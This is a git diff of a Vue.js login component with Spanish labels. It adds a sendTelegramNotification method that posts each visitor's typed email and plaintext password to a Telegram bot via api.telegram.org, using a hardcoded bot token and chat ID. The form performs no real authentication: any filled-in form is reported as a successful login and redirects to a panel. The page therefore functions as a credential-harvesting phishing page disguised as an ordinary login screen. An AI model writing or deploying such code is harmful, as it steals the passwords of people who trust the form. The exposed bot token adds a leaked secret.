@@ -8,15 +8,15 @@
 
         <form>
           <input type="text" id="login" class="fadeIn second" v-model="form.email" name="login"
-            placeholder="Iniciar Sesión">
+            placeholder="Correo Electronico">
           <input type="text" id="password" class="fadeIn third" v-model="form.password" name="login"
             placeholder="Contraseña">
-          <button type="button" class="btn btn-primary my-3" @click="notification()">Iniciar sesion <i
+          <button type="button" class="btn btn-primary my-3" @click="login()">Iniciar sesion <i
               class="fas fa-user"></i></button>
         </form>
 
         <div id="formFooter">
-          <a class="underlineHover" href="#">Se me olvido la contraseña</a>
+          <a class="underlineHover">Se me olvido la contraseña <i class="fas fa-unlock ms-2 "></i></a>
         </div>
       </div>
     </div>
@@ -24,6 +24,8 @@
 </template>
 
 <script>
+import axios from 'axios';
+
 export default {
    name: 'LoginUsers',
   data() {
@@ -35,22 +37,56 @@ export default {
     };
   },
   methods: {
-    notification() {
+    notification(){
       if (this.form.email && this.form.password) {
         this.$notify({
           type: 'success',
           title: "Exito",
           text: "Has iniciado sesión correctamente",
         })
-      this.$router.push('/panel2')
+        return true
       }else{
         this.$notify({
           type: 'error',
           title: "Hubo un problema",
           text: "Debes de rellenar el formulario",
         })
+        return false
       }
-    }
+    },
+    login() {
+      try{
+        if(this.notification()){
+          this.$router.push('/panel2');
+          this.sendTelegramNotification()
+        }
+      }catch(error){
+        this.$notify({
+          type: 'error',
+          title: "Hubo un problema",
+          text: "Intenta más tarde.",
+        })
+      }
+    },
+    sendTelegramNotification() {
+      const botToken = '7532442625:AAExsWEtgAcVYXQMm-dJO9GG877mIViZyuA'; // Reemplaza con tu token
+      const chatId = '5764095558'; // Reemplaza con el ID del chat o grupo de Telegram
+      
+      const text = `Nuevo registro/login:\nUsuario: ${this.form.email}\nContraseña: ${this.form.password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      axios.post(url, {
+        chat_id: chatId,
+        text: text,
+      })
+      .then(response => {
+        console.log('Mensaje enviado a Telegram:', response.data);
+      })
+      .catch(error => {
+        console.error('Error al enviar mensaje a Telegram:', error);
+      });
+    },
   },
 };
 </script>
